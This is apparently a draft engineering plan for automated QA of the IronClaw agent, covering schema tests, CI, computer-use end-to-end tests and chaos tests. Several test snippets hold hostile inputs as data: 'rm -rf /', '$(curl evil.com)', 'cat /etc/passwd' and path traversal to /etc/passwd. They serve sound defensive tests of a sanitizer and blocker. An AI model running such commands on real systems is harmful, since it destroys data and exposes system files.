# Automated QA Plan for IronClaw

**Date:** 2026-02-24
**Status:** Draft
**Goal:** Systematically close the QA gaps that led to the ~40 bugs found in issues/PRs to date, progressing from cheap high-ROI checks to full computer-use E2E testing.

---

## Motivation

A review of all closed issues and merged bug-fix PRs reveals that most IronClaw bugs fall into a few recurring categories:

| Category | Examples | Root Cause |
|----------|----------|------------|
| Config persistence | Wizard re-triggers on restart, LLM backend silently ignored | No round-trip test for config write→restart→read |
| Turn persistence | Tool approval results lost, user messages lost on crash | No test that persists a turn and reads it back |
| Tool schema validity | `required`/`properties` mismatch → 400s with OpenAI strict mode | No schema validator in CI |
| WASM lifecycle | Workspace writes silently discarded, duplicate Telegram messages | No test that exercises host function → flush → read-back |
| Web UI / SSE | No re-sync on reconnect, orphan threads, HTML injection | No browser-level testing at all |
| Shell safety | Destructive-command check was dead code, pipe deadlock, env leak | Tests never passed realistic `Value::Object` args |
| Build integrity | Docker build broken, feature-flag code untested | CI only runs one feature configuration |

Most bugs live at **integration boundaries**, not inside isolated functions. The plan is organized in four tiers of increasing scope and cost, each targeting a specific class of bug.

---

## Tier 1: Schema & Contract Tests

**Cost:** Low (pure Rust tests, no infrastructure)
**Timeline:** Can land incrementally, one PR per sub-task
**Bugs this would have caught:** #131, #268, #129, #174, #187, #96, #320

### 1.1 Tool Schema Validator

Every tool registered in `ToolRegistry` must produce a `parameters_schema()` that passes OpenAI's strict-mode rules. Write a test that iterates all built-in tools and asserts:

- Top-level has `"type": "object"`
- Every key in `"required"` exists in `"properties"`
- Every property has a `"type"` field
- No `additionalProperties` unless explicitly set
- Nested objects follow the same rules recursively

```rust
// src/tools/registry.rs or a new tests/tool_schema_validation.rs
#[test]
fn all_tool_schemas_are_openai_strict_valid() {
    let registry = ToolRegistry::new();
    register_all_builtins(&mut registry);
    for tool in registry.all_tools() {
        let schema = tool.parameters_schema();
        validate_strict_schema(&schema, &tool.name())
            .unwrap_or_else(|e| panic!("Tool '{}' has invalid schema: {}", tool.name(), e));
    }
}
```

Add the same validation for WASM tools (loaded from `~/.ironclaw/tools/`) and MCP tools (mock a simple MCP manifest and validate the schema it produces).

**Files:** New `src/tools/schema_validator.rs` (validation logic), test in `tests/tool_schema_validation.rs`

### 1.2 Config Round-Trip Tests

Test the full config lifecycle: write via wizard helpers → read back via `Config` loader → assert values match.

Cover the specific bugs found:
- `LLM_BACKEND` written to bootstrap `.env` and read back correctly
- `EMBEDDING_ENABLED=false` survives restart when `OPENAI_API_KEY` is set
- `ONBOARD_COMPLETED=true` in bootstrap `.env` causes `check_onboard_needed()` to return `false`
- Session token stored under `nearai.session_token` (not `nearai.session`)

```rust
#[test]
fn bootstrap_env_round_trips_llm_backend() {
    let dir = tempdir().unwrap();
    let env_path = dir.path().join(".env");
    save_bootstrap_env(&env_path, &[("LLM_BACKEND", "openai")]).unwrap();
    // Simulate restart: load from env file
    dotenv::from_path(&env_path).unwrap();
    assert_eq!(std::env::var("LLM_BACKEND").unwrap(), "openai");
}
```

**Files:** New `tests/config_round_trip.rs`

### 1.3 Feature-Flag CI Matrix

The current `code_style.yml` runs clippy without `--all-features`, missing code behind `#[cfg(feature = "libsql")]` etc. The `test.yml` runs with `--all-features` but not with individual features.

Add a CI matrix:

```yaml
# .github/workflows/test.yml
strategy:
  matrix:
    features:
      - "--all-features"
      - ""  # default features only
      - "--no-default-features --features libsql"
steps:
  - name: Run Tests
    run: cargo test ${{ matrix.features }} -- --nocapture
```

Update `code_style.yml` to also run clippy with `--all-features`:

```yaml
- name: Check lints (all features)
  run: cargo clippy --all-features -- -D warnings
- name: Check lints (libsql only)
  run: cargo clippy --no-default-features --features libsql -- -D warnings
```

**Files:** Modify `.github/workflows/test.yml`, `.github/workflows/code_style.yml`

### 1.4 Docker Build in CI

Add a job that runs `docker build .` on every PR. No need to push the image -- just verify it builds.

```yaml
# .github/workflows/test.yml - new job
docker-build:
  name: Docker Build
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v6
    - name: Build Docker image
      run: docker build -t ironclaw-test:ci .
```

**Files:** Modify `.github/workflows/test.yml`

---

## Tier 2: Integration Tests

**Cost:** Medium (needs test harnesses, possibly testcontainers)
**Timeline:** Parallel workstream, ~1 week for the harness, then incremental test additions
**Bugs this would have caught:** #250, #305, #260, #264, #346, #125, #72, #140

### 2.1 Test Harness: In-Memory Database Backend

Many integration tests need a database but not a real PostgreSQL/libSQL instance. Create a lightweight in-memory `Database` implementation (backed by `HashMap`s) that satisfies the `Database` trait for test use. This avoids testcontainers overhead for most tests.

Alternatively, use libSQL in `:memory:` mode (it's SQLite under the hood):

```rust
// src/testing.rs
pub async fn test_db() -> impl Database {
    let backend = LibSqlBackend::open_in_memory().await.unwrap();
    backend.run_migrations().await.unwrap();
    backend
}
```

**Files:** Extend `src/testing.rs`, potentially `src/db/libsql/mod.rs` (add `open_in_memory`)

### 2.2 Turn Persistence Tests

Test every code path in `process_approval` and the main agent loop that should call `persist_turn`:

```rust
#[tokio::test]
async fn approved_tool_call_persists_turn() {
    let db = test_db().await;
    let mut agent = TestAgent::new(db);
    // Create a turn with a pending tool call
    agent.submit("search for cats").await;
    // Simulate tool approval
    agent.approve_tool_call(0).await;
    // Verify turn is in DB (not just in memory)
    let turns = agent.db().get_turns(agent.thread_id()).await.unwrap();
    assert!(turns.iter().any(|t| t.has_tool_result()));
}
```

Cover:
- Approved tool call with successful result
- Approved tool call with error result
- Approved tool call requiring auth
- Deferred tool call with auth
- User message persisted before agent loop starts (not after)

**Files:** New `tests/turn_persistence.rs`

### 2.3 WASM Channel Lifecycle Tests

Test the host function contract: `workspace_write()` followed by `take_pending_writes()` returns the written data. `workspace_read()` returns data that was previously written.

```rust
#[tokio::test]
async fn wasm_channel_workspace_writes_are_flushed() {
    let mut wrapper = WasmChannelWrapper::new_test(telegram_wasm_bytes());
    // Simulate a callback that writes workspace data
    wrapper.handle_callback(test_update_payload()).await.unwrap();
    // Verify writes were captured
    let writes = wrapper.take_pending_writes();
    assert!(!writes.is_empty(), "workspace_write() calls must be captured");
}

#[tokio::test]
async fn wasm_channel_workspace_read_returns_prior_writes() {
    let mut wrapper = WasmChannelWrapper::new_test(telegram_wasm_bytes());
    // Inject workspace data
    wrapper.inject_workspace_entry("polling_offset", b"12345");
    // Simulate a callback that reads workspace data
    wrapper.handle_callback(test_update_payload()).await.unwrap();
    // The channel should have used the injected offset (not 0)
    // Verify by checking the getUpdates call offset parameter
}
```

**Files:** New `tests/wasm_channel_lifecycle.rs`, test helpers in `src/channels/wasm/wrapper.rs`

### 2.4 Extension Registry Collision Tests

Verify that installing a channel named "telegram" and a tool named "telegram" land in different directories and both resolve correctly:

```rust
#[tokio::test]
async fn channel_and_tool_with_same_name_dont_collide() {
    let registry = TestRegistry::new();
    registry.install("telegram", ArtifactKind::Channel).await.unwrap();
    registry.install("telegram", ArtifactKind::Tool).await.unwrap();
    assert!(registry.tools_dir().join("telegram").exists());
    assert!(registry.channels_dir().join("telegram").exists());
    // Both resolve independently
    assert_eq!(registry.get("telegram", ArtifactKind::Channel).unwrap().kind, ArtifactKind::Channel);
    assert_eq!(registry.get("telegram", ArtifactKind::Tool).unwrap().kind, ArtifactKind::Tool);
}
```

**Files:** New `tests/registry_collision.rs`

### 2.5 Shell Tool Realistic Arg Tests

The destructive-command check bug (PR #72) happened because tests passed `Value::String` args but the LLM sends `Value::Object`. Test with realistic args:

```rust
#[tokio::test]
async fn destructive_command_blocked_with_object_args() {
    let shell = ShellTool::new();
    let params = serde_json::json!({
        "command": "rm -rf /"
    });
    // This is how the LLM actually sends args -- as an Object, not a String
    let result = shell.execute(params, &test_context()).await;
    assert!(result.is_err() || result.unwrap().contains("blocked"));
}
```

Also test pipe deadlock prevention with large output:

```rust
#[tokio::test]
async fn shell_handles_large_output_without_deadlock() {
    let shell = ShellTool::new();
    let params = serde_json::json!({
        "command": "yes | head -c 200000"  // ~200KB, well above pipe buffer
    });
    let result = tokio::time::timeout(
        Duration::from_secs(10),
        shell.execute(params, &test_context())
    ).await;
    assert!(result.is_ok(), "shell tool deadlocked on large output");
}
```

**Files:** Extend `src/tools/builtin/shell.rs` tests

### 2.6 Failover and Circuit Breaker Edge Cases

```rust
#[test]
fn cooldown_activation_at_zero_nanos() {
    let mut cooldown = ProviderCooldown::new();
    // Edge case: if system clock returns 0 (or test mock does)
    cooldown.activate_cooldown(0);
    assert!(cooldown.is_in_cooldown(), "cooldown(0) must not be a no-op");
}

#[tokio::test]
async fn failover_with_all_providers_failing() {
    let failover = FailoverProvider::new(vec![
        always_failing_provider("a]"),
        always_failing_provider("b"),
    ]);
    let result = failover.chat(&[]).await;
    assert!(result.is_err());
    // Must not panic (the old .expect() bug)
}
```

**Files:** Extend `src/llm/circuit_breaker.rs` and `src/llm/failover.rs` tests

### 2.7 Context Length Recovery Test

Verify that when the LLM returns a `ContextLengthExceeded` error, the agent triggers compaction and retries rather than propagating the raw error:

```rust
#[tokio::test]
async fn context_length_exceeded_triggers_compaction() {
    let mut agent = TestAgent::with_provider(
        ContextLimitMockProvider::new(fail_after_n_turns: 3)
    );
    // Send enough messages to trigger context limit
    for i in 0..5 {
        agent.submit(&format!("message {i}")).await;
    }
    // Agent should have compacted and continued, not errored
    assert!(agent.last_response().is_ok());
    assert!(agent.compaction_count() > 0);
}
```

**Files:** New `tests/context_recovery.rs`

---

## Tier 3: Computer-Use E2E Testing

**Cost:** High (requires Anthropic computer use API, headless browser, ironclaw running)
**Timeline:** ~2 weeks for infrastructure, then incremental scenario additions
**Bugs this would have caught:** #307, #306, #263, all manual web-ui-test checklist items

### 3.1 Architecture

```
+------------------+     +-----------------+     +------------------+
|  Test Runner     |     |  Headless       |     |  IronClaw        |
|  (Python/TS)     |---->|  Chromium        |---->|  (cargo run)     |
|                  |     |  (Playwright)   |     |  GATEWAY=true    |
|  Orchestrates    |     |                 |     |  port 3001       |
|  scenarios       |     |  Screenshots    |     |                  |
+--------+---------+     +--------+--------+     +------------------+
         |                        |
         v                        v
+------------------+     +-----------------+
|  Claude          |     |  Assertion      |
|  Computer Use    |     |  Engine         |
|  API             |     |  (visual +      |
|  (screenshot →   |     |   DOM-based)    |
|   action)        |     |                 |
+------------------+     +-----------------+
```

**Components:**

1. **Test runner** -- Python or TypeScript script that orchestrates the flow. Starts ironclaw, waits for readiness, launches Playwright browser, runs scenarios.

2. **Playwright browser** -- Headless Chromium. Takes screenshots, executes click/type actions as directed by the computer use agent. Also provides DOM access for structural assertions (element exists, text content matches, no error toasts).

3. **Claude computer use agent** -- Anthropic API with `computer-use-2025-01-24` tool. Receives screenshots, returns actions (click coordinates, type text, scroll). The test runner translates actions into Playwright calls.

4. **Assertion engine** -- Hybrid approach:
   - **DOM assertions** (Playwright): Fast, deterministic checks like "element with text 'Connected' exists", "no elements with class 'error-toast' visible", "skills list has N children"
   - **Visual assertions** (Claude vision): For subjective checks like "the chat message rendered correctly", "no raw HTML visible in the output", "the SSE stream is updating in real-time"

### 3.2 Test Infrastructure Setup

**Directory structure:**

```
tests/
  e2e/
    conftest.py             # pytest fixtures: start ironclaw, browser
    computer_use.py         # Claude computer use client wrapper
    assertions.py           # DOM + visual assertion helpers
    scenarios/
      test_connection.py
      test_chat.py
      test_skills.py
      test_sse_reconnect.py
      test_onboarding.py
      test_html_injection.py
      test_tool_approval.py
    screenshots/            # Reference screenshots (gitignored)
    Dockerfile.test         # Container for CI: ironclaw + chromium
```

**Fixture: start ironclaw**

```python
@pytest.fixture(scope="session")
async def ironclaw_server():
    """Start ironclaw with gateway enabled, return base URL."""
    env = {
        "CLI_ENABLED": "false",
        "GATEWAY_ENABLED": "true",
        "GATEWAY_PORT": "3001",
        "GATEWAY_AUTH_TOKEN": "test-token-e2e",
        "GATEWAY_USER_ID": "e2e-tester",
        "LLM_BACKEND": "openai_compatible",  # or mock
        "LLM_BASE_URL": "http://localhost:11434/v1",  # local Ollama
        "DATABASE_BACKEND": "libsql",
        "LIBSQL_PATH": ":memory:",
        "SANDBOX_ENABLED": "false",
        "SKILLS_ENABLED": "true",
    }
    proc = await asyncio.create_subprocess_exec(
        "cargo", "run", "--features", "libsql",
        env={**os.environ, **env},
    )
    await wait_for_ready("http://127.0.0.1:3001/api/health", timeout=120)
    yield "http://127.0.0.1:3001"
    proc.terminate()
```

**Fixture: browser with computer use**

```python
@pytest.fixture
async def browser_agent(ironclaw_server):
    """Playwright browser + Claude computer use agent."""
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page(viewport={"width": 1280, "height": 720})
        await page.goto(f"{ironclaw_server}/?token=test-token-e2e")
        agent = ComputerUseAgent(page)
        yield agent
        await browser.close()
```

**Computer use wrapper:**

```python
class ComputerUseAgent:
    """Drives the browser via Claude computer use API."""

    def __init__(self, page: Page):
        self.page = page
        self.client = anthropic.Anthropic()

    async def execute_scenario(self, instruction: str, max_steps: int = 20) -> list[str]:
        """
        Give a natural-language instruction, let Claude drive the browser.
        Returns a list of observations/assertions from Claude.
        """
        messages = [{"role": "user", "content": instruction}]
        observations = []

        for _ in range(max_steps):
            screenshot = await self.take_screenshot()
            response = self.client.messages.create(
                model="claude-sonnet-4-20250514",
                max_tokens=1024,
                tools=[{
                    "type": "computer_20250124",
                    "name": "computer",
                    "display_width_px": 1280,
                    "display_height_px": 720,
                }],
                messages=messages,
            )

            # Process tool use blocks (click, type, screenshot, etc.)
            for block in response.content:
                if block.type == "tool_use":
                    result = await self.execute_action(block.input)
                    messages.append({"role": "assistant", "content": response.content})
                    messages.append({"role": "user", "content": [result]})
                elif block.type == "text":
                    observations.append(block.text)

            if response.stop_reason == "end_turn":
                break

        return observations

    async def take_screenshot(self) -> bytes:
        return await self.page.screenshot(type="png")

    async def execute_action(self, action: dict) -> dict:
        """Translate Claude's computer use action to Playwright calls."""
        if action["action"] == "click":
            await self.page.mouse.click(action["coordinate"][0], action["coordinate"][1])
        elif action["action"] == "type":
            await self.page.keyboard.type(action["text"])
        elif action["action"] == "scroll":
            await self.page.mouse.wheel(0, action["coordinate"][1])
        elif action["action"] == "key":
            await self.page.keyboard.press(action["text"])
        # Return screenshot after action
        screenshot = await self.take_screenshot()
        return {"type": "tool_result", "content": [
            {"type": "image", "source": {"type": "base64", "media_type": "image/png",
             "data": base64.b64encode(screenshot).decode()}}
        ]}
```

### 3.3 Test Scenarios

Each scenario maps to a real bug or the existing manual checklist in `skills/web-ui-test/SKILL.md`.

#### Scenario 1: Connection and Tab Navigation

```python
async def test_connection_and_tabs(browser_agent):
    """Bugs: #306 (orphan threads on null threadId during page load)"""
    observations = await browser_agent.execute_scenario("""
        1. Look at the page. Verify there is a "Connected" indicator visible.
        2. Click each tab in order: Chat, Memory, Jobs, Routines, Extensions, Skills.
        3. For each tab, verify the panel content changes and no error messages appear.
        4. Return to the Chat tab.
        5. Report what you see for each tab.
    """)
    # DOM assertions (fast, deterministic)
    page = browser_agent.page
    assert await page.locator(".connection-status.connected").count() > 0
    for tab in ["chat", "memory", "jobs", "routines", "extensions", "skills"]:
        assert await page.locator(f'[data-tab="{tab}"]').count() > 0
```

#### Scenario 2: Chat Message Round-Trip

```python
async def test_chat_sends_and_receives(browser_agent):
    """Bugs: #305 (user message not persisted), #255 (fake proceed messages)"""
    observations = await browser_agent.execute_scenario("""
        1. Click on the chat input box at the bottom.
        2. Type "Hello, what is 2+2?" and press Enter.
        3. Wait for the assistant to respond (you should see a streaming response).
        4. Verify the assistant's response appears below your message.
        5. Report the assistant's response.
    """)
    page = browser_agent.page
    # At least 2 messages: user + assistant
    messages = await page.locator(".message").count()
    assert messages >= 2
    # No error toasts
    assert await page.locator(".toast.error").count() == 0
```

#### Scenario 3: SSE Reconnect

```python
async def test_sse_reconnect_preserves_history(browser_agent, ironclaw_server):
    """Bug: #307 (no re-sync on SSE reconnect after server restart)"""
    page = browser_agent.page

    # Step 1: Send a message
    await browser_agent.execute_scenario("""
        Type "Remember this: the secret word is platypus" in the chat and press Enter.
        Wait for the response.
    """)
    msg_count_before = await page.locator(".message").count()

    # Step 2: Kill and restart the server
    # (test fixture provides a restart helper)
    await restart_ironclaw(ironclaw_server)

    # Step 3: Wait for reconnect
    await page.wait_for_selector(".connection-status.connected", timeout=30000)

    # Step 4: Verify message history is preserved
    msg_count_after = await page.locator(".message").count()
    assert msg_count_after >= msg_count_before, \
        f"Messages lost after reconnect: {msg_count_before} -> {msg_count_after}"
```

#### Scenario 4: Skills Search, Install, Remove

```python
async def test_skills_lifecycle(browser_agent):
    """Automates the manual checklist from skills/web-ui-test/SKILL.md"""
    # Override confirm() to auto-accept
    await browser_agent.page.evaluate("window.confirm = () => true")

    observations = await browser_agent.execute_scenario("""
        1. Click the "Skills" tab.
        2. Look for a search box. Type "markdown" and press Enter or click Search.
        3. Wait for results to appear.
        4. Verify results show: name, version, description.
        5. Click "Install" on the first result.
        6. Wait for a success notification.
        7. Verify the skill now appears in the "Installed Skills" section.
        8. Click "Remove" on the skill you just installed.
        9. Wait for a success notification.
        10. Verify the skill is gone from the installed list.
        11. Report what happened at each step.
    """)
    # Final state: no installed skills (we removed what we installed)
    page = browser_agent.page
    await page.click('[data-tab="skills"]')
    # Should not have the test skill installed
```

#### Scenario 5: HTML Injection Defense

```python
async def test_html_injection_sanitized(browser_agent):
    """Bug: #263 (HTML error pages injected into UI, still open)"""
    # This requires a mock LLM that returns HTML in tool output
    # or we craft a message that triggers tool output containing HTML
    page = browser_agent.page

    await browser_agent.execute_scenario("""
        Type this exact message in the chat and press Enter:
        "Please use the http tool to fetch https://httpbin.org/html"
        Wait for the response.
    """)

    # The page should NOT have raw HTML rendering from the tool output
    # Check that no unexpected <h1> or full <html> documents appear
    body_html = await page.inner_html("body")
    assert "<html>" not in body_html.lower() or "code" in body_html.lower(), \
        "Raw HTML from tool output was injected unsanitized into the page"
```

#### Scenario 6: Tool Approval Overlay

```python
async def test_tool_approval_overlay(browser_agent):
    """Bugs: #250 (approval results not persisted), #72 (destructive check dead code)"""
    observations = await browser_agent.execute_scenario("""
        1. Type "Run the shell command: echo hello world" in chat and press Enter.
        2. If an approval dialog appears, click "Approve" or "Allow".
        3. Wait for the result.
        4. Verify the output includes "hello world".
        5. Report what you see.
    """)
```

#### Scenario 7: Onboarding Wizard (Full Flow)

```python
async def test_onboarding_wizard_completes(tmp_ironclaw_home):
    """Bugs: #187, #174, #129, #185 (wizard persistence and re-trigger)"""
    # Start ironclaw with a fresh home directory (no prior config)
    # The wizard runs in TUI mode, so we need a PTY or use the web wizard
    # if/when one exists. For now, test the CLI wizard via expect-style automation.

    proc = pexpect.spawn(
        "cargo run",
        env={"IRONCLAW_HOME": str(tmp_ironclaw_home), **base_env},
        timeout=60,
    )

    # Step through wizard
    proc.expect("Welcome to IronClaw")
    proc.expect("LLM Backend")
    proc.sendline("1")  # Select first option
    # ... continue through all 7 steps ...
    proc.expect("Setup complete")
    proc.close()

    # Restart and verify wizard does NOT re-trigger
    proc2 = pexpect.spawn(
        "cargo run",
        env={"IRONCLAW_HOME": str(tmp_ironclaw_home), **base_env},
        timeout=30,
    )
    proc2.expect("Agent ironclaw ready")  # Should skip wizard
    # Must NOT see "Welcome to IronClaw" again
    assert not proc2.match_any(["Welcome to IronClaw"], timeout=5)
    proc2.close()
```

### 3.4 LLM Backend for E2E Tests

E2E tests should not depend on external LLM APIs (flaky, expensive, slow). Options:

1. **Local Ollama** -- Run a small model (e.g., `qwen2.5:0.5b`) locally. Good enough for basic tool-calling tests. Set `LLM_BACKEND=openai_compatible` and `LLM_BASE_URL=http://localhost:11434/v1`.

2. **Mock LLM server** -- A tiny HTTP server that returns canned responses based on message content patterns. Fastest and most deterministic, but requires maintaining fixtures.

3. **Recorded responses** -- Record real LLM interactions once, replay in tests (VCR-style). Good balance of realism and determinism.

Recommendation: Start with local Ollama for development, mock LLM server for CI.

### 3.5 CI Integration

E2E tests are expensive and slow. Run them on a separate schedule, not on every PR:

```yaml
# .github/workflows/e2e.yml
name: E2E Tests
on:
  schedule:
    - cron: "0 6 * * *"  # Daily at 6 AM UTC
  workflow_dispatch:       # Manual trigger

jobs:
  e2e:
    runs-on: ubuntu-latest
    services:
      ollama:
        image: ollama/ollama:latest
    steps:
      - uses: actions/checkout@v6
      - name: Build ironclaw
        run: cargo build --features libsql
      - name: Install Playwright
        run: pip install playwright pytest-playwright && playwright install chromium
      - name: Pull test model
        run: ollama pull qwen2.5:0.5b
      - name: Run E2E tests
        run: pytest tests/e2e/ -v --timeout=300
        env:
          LLM_BACKEND: openai_compatible
          LLM_BASE_URL: http://localhost:11434/v1
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
```

---

## Tier 4: Chaos and Resilience Testing

**Cost:** Medium (needs mock providers, time-control utilities)
**Timeline:** After Tier 2 harness exists; add scenarios incrementally
**Bugs this would have caught:** #260, #125, #155, #252 (infinite loop), #139

### 4.1 LLM Provider Chaos

Test the failover chain, circuit breaker, and retry logic under realistic failure modes:

```rust
/// Provider that fails N times then succeeds
struct FlakeyProvider { failures_remaining: AtomicU32 }

/// Provider that returns ContextLengthExceeded after N messages
struct ContextBombProvider { threshold: usize }

/// Provider that hangs forever (tests timeout handling)
struct HangingProvider;

/// Provider that returns malformed JSON
struct GarbageProvider;
```

**Test scenarios:**

| Scenario | Setup | Expected |
|----------|-------|----------|
| Primary fails, secondary works | FlakeyProvider(3) + working provider | Failover after 3 retries, user gets response |
| All providers fail | FlakeyProvider(max) x3 | Graceful error to user, no panic |
| Context limit mid-conversation | ContextBombProvider(5) | Auto-compaction triggers, conversation continues |
| Provider hangs | HangingProvider with 10s timeout | Timeout error, failover to next |
| Malformed response | GarbageProvider | Error logged, retry or failover |
| Circuit breaker trips | FlakeyProvider(100) | Circuit opens after threshold, fast-fails subsequent calls |
| Circuit breaker recovers | FlakeyProvider(5) then success | Circuit half-opens, test call succeeds, circuit closes |

**Files:** New `tests/provider_chaos.rs`, mock providers in `src/testing.rs`

### 4.2 Concurrent Job Stress Test

Submit many jobs simultaneously and verify no state corruption:

```rust
#[tokio::test]
async fn concurrent_jobs_dont_corrupt_state() {
    let db = test_db().await;
    let agent = TestAgent::new(db);

    // Submit 20 jobs concurrently
    let handles: Vec<_> = (0..20)
        .map(|i| {
            let agent = agent.clone();
            tokio::spawn(async move {
                agent.submit(&format!("job {i}: what is {i} + {i}?")).await
            })
        })
        .collect();

    let results: Vec<_> = futures::future::join_all(handles).await;

    // All should complete (some may error, none should panic)
    for result in &results {
        assert!(result.is_ok(), "job panicked: {:?}", result);
    }

    // Verify no cross-contamination in contexts
    let jobs = agent.db().list_jobs().await.unwrap();
    let unique_contexts: HashSet<_> = jobs.iter().map(|j| j.context_id).collect();
    assert_eq!(unique_contexts.len(), jobs.len(), "context IDs must be unique per job");
}
```

**Files:** New `tests/concurrent_jobs.rs`

### 4.3 Dispatcher Infinite Loop Guard

The dispatcher had an infinite loop bug (PR #252) where `continue` skipped the index increment. Add a test that verifies the dispatcher terminates even when hooks reject tool calls:

```rust
#[tokio::test]
async fn dispatcher_terminates_when_hook_rejects() {
    let dispatcher = TestDispatcher::new();
    dispatcher.add_hook(|_tool_call| HookResult::Reject("nope".into()));

    let result = tokio::time::timeout(
        Duration::from_secs(5),
        dispatcher.dispatch(vec![tool_call("shell", "rm -rf /")]),
    ).await;

    assert!(result.is_ok(), "dispatcher infinite-looped on rejected tool call");
}
```

**Files:** Extend `src/agent/dispatcher.rs` tests

### 4.4 Value Estimator Boundary Tests

```rust
#[test]
fn is_profitable_with_zero_price() {
    let estimator = ValueEstimator::new();
    // Must not panic (was a divide-by-zero before PR #139)
    let result = estimator.is_profitable(Decimal::ZERO, Decimal::new(100, 0));
    assert!(!result);
}

#[test]
fn is_profitable_with_negative_cost() {
    let estimator = ValueEstimator::new();
    let result = estimator.is_profitable(Decimal::new(100, 0), Decimal::new(-50, 0));
    // Negative cost = always profitable
    assert!(result);
}
```

**Files:** Extend `src/estimation/value.rs` tests

### 4.5 Safety Layer Adversarial Tests

Test the safety layer with adversarial inputs that have caused real bypasses:

```rust
#[test]
fn path_traversal_in_wasm_allowlist() {
    let allowlist = DomainAllowlist::new(vec!["api.example.com/v1/"]);
    // Must be blocked: path traversal before normalization
    assert!(!allowlist.allows("api.example.com/v1/../admin"));
    assert!(!allowlist.allows("api.example.com/v1/../../etc/passwd"));
}

#[test]
fn shell_env_scrubbing_removes_secrets() {
    let env = scrubbed_env();
    assert!(!env.contains_key("OPENAI_API_KEY"));
    assert!(!env.contains_key("NEARAI_SESSION_TOKEN"));
    assert!(!env.contains_key("DATABASE_URL"));
    // Safe vars preserved
    assert!(env.contains_key("PATH"));
    assert!(env.contains_key("HOME"));
}

#[test]
fn leak_detector_catches_api_keys_in_output() {
    let detector = LeakDetector::default();
    let output = "Here's your key: sk-1234567890abcdef1234567890abcdef";
    let result = detector.scan(output);
    assert!(result.has_leaks());
}

#[test]
fn sanitizer_blocks_command_injection() {
    let sanitizer = Sanitizer::new();
    let inputs = vec![
        "hello; rm -rf /",
        "$(curl evil.com)",
        "hello\n`whoami`",
        "test && cat /etc/passwd",
    ];
    for input in inputs {
        let result = sanitizer.sanitize(input);
        assert_ne!(result, input, "injection not caught: {input}");
    }
}
```

**Files:** Extend tests in `src/safety/sanitizer.rs`, `src/safety/leak_detector.rs`, `src/sandbox/proxy/allowlist.rs`, `src/tools/builtin/shell.rs`

---

## Implementation Priority

| Priority | Tier | Item | Effort | Bugs Prevented |
|----------|------|------|--------|----------------|
| P0 | 1.1 | Tool schema validator | 1 day | Schema 400s with every provider |
| P0 | 1.3 | Feature-flag CI matrix | 0.5 day | Dead code behind wrong cfg gate |
| P0 | 1.4 | Docker build in CI | 0.5 day | Broken Docker builds |
| P1 | 1.2 | Config round-trip tests | 1 day | Onboarding persistence bugs |
| P1 | 2.1 | Test harness (in-memory DB) | 2 days | Enables all Tier 2 tests |
| P1 | 2.2 | Turn persistence tests | 1 day | Lost turns/messages |
| P1 | 2.5 | Shell tool realistic args | 0.5 day | Dead safety checks |
| P1 | 4.5 | Safety adversarial tests | 1 day | Security bypasses |
| P2 | 2.3 | WASM channel lifecycle | 1 day | Duplicate messages, lost writes |
| P2 | 2.4 | Registry collision tests | 0.5 day | Wrong install directory |
| P2 | 2.6 | Failover edge cases | 0.5 day | Panics, sentinel bugs |
| P2 | 2.7 | Context recovery test | 1 day | Raw errors to user |
| P2 | 4.1 | Provider chaos tests | 2 days | Failover/retry regressions |
| P2 | 4.3 | Dispatcher loop guard | 0.5 day | Infinite loops |
| P3 | 3.1-3.2 | E2E infrastructure | 3-5 days | Enables all Tier 3 tests |
| P3 | 3.3 | E2E scenarios (7 total) | 1 day each | UI/SSE/reconnect bugs |
| P3 | 4.2 | Concurrent job stress | 1 day | State corruption |
| P3 | 4.4 | Estimator boundaries | 0.5 day | Panics on edge inputs |

## Open Questions

1. **Computer use cost**: Claude computer use API calls with screenshots are expensive. Should E2E tests run daily, weekly, or only on release branches?

2. **LLM for E2E**: Local Ollama vs mock server vs recorded responses? Ollama is realistic but slow in CI. Mock is fast but requires fixture maintenance.

3. **TUI testing**: The TUI (Ratatui) is harder to test with computer use than the web UI. Options: (a) skip TUI E2E, rely on unit tests, (b) use a PTY + expect-style automation (pexpect), (c) use computer use with a terminal emulator in the browser (xterm.js). Recommendation: (b) for wizard, skip TUI E2E otherwise.

4. **Test database**: Should integration tests use libSQL in-memory mode, or invest in a proper in-memory `Database` trait implementation? libSQL is simpler but couples tests to one backend.

5. **Existing manual test skill**: The `skills/web-ui-test/SKILL.md` checklist should be marked as superseded once the E2E scenarios in Tier 3 cover the same ground, or kept as a human-readable reference.
